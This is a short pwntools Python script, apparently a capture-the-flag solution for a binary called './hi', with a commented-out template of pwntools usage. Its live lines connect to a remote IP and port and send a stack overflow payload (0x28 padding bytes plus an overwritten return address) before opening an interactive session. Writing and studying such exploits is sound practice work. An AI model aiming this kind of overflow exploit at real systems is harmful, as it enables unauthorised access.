from pwn import *
import sys

#########################################################
BINARY="./hi"
ENV={}
GDB="break *main"
HOST="46.101.199.176"
PORT=9000
#########################################################

# if len(sys.argv) < 2:
    # print "args: bin|net|ida|gdb\n"
    # sys.exit(1)

# if sys.argv[1] == "bin":
    # p = process(BINARY, env=ENV)
# elif sys.argv[1] == "net":
    # p = remote(HOST, PORT)
# elif sys.argv[1] == "ida":
    # p = process("./linux_server", env=ENV)
    # p.recvuntil("0.1...")
# elif sys.argv[1] == "gdb":
    # p = process(BINARY, env=ENV)
    # gdb.attach(p, GDB)
# else:
    # print "args: bin|net|ida|gdb\n"
    # sys.exit(1)

# binary = ELF(BINARY)

#p.recv() read all avaiable output
#p.recv(n) read n bytes
#p.recvuntil(string) read until string
#p.recvline() read a line
#p.recvline(False) read a line (discard newline char)
#p.recvall() read until EOF

#p.send(string) send
#p.sendline(string) send string + "\n"

#p.close()
#p.interactive() open a shell-like prompt

#binary.symbols a dict { symbol_name: address }
#binary.got a dict { got_entry_name: address }

# r = process(BINARY)
r = remote(HOST, PORT)
binary = ELF(BINARY)
# Wait for debugger
# pid = util.proc.pidof(r)[0]
# print("The pid is: "+str(pid))
# util.proc.wait_for_debugger(pid)

# gdb.attach(r)

exploit = ("a"*0x28).encode() + p64(0x00400706)
print(exploit)
# print(exploit)
# exploit = "0"*32 
# print(r.recv(400))
r.sendline(exploit)
# print(r.recvall())
r.interactive()
# print(r.recv(400))

